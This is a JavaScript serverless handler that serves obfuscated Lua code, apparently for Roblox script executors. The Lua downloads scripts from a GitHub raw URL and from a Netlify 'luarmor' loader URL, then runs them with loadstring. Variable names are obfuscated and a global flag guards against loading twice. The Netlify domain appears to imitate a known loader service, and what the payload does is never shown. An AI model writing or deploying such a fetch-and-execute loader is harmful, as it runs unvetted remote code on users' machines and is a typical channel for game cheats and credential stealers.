export default function handler(req, res) {
  const luaCode = `
    local v1 = "https://raw.githubusercontent.com/ShexYt/kabuchalacaca/refs/heads/main/bitches.lua.txt"
    local v2 = "https://luarmor.netlify.app/api/loader/Bn9uK7ojH7510lsgJKAPkhw10AQWV"

    local function v3()
        if _G["v4"] then
            return true
        else
            return false
        end
    end

    local function v5()
        local success, result = pcall(function()
            local scriptContent = game:HttpGet(v1, true)
            loadstring(scriptContent)()
        end)
        
        if success then
            _G["v4"] = true
        end
    end

    local function v6()
        local success, result = pcall(function()
            local scriptContent = game:HttpGet(v2, true)
            loadstring(scriptContent)()
        end)
    end

    local function v7()
        if v3() then
        else
            v5()
        end
    end

    v7()
  `;
  
  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send(luaCode);
}
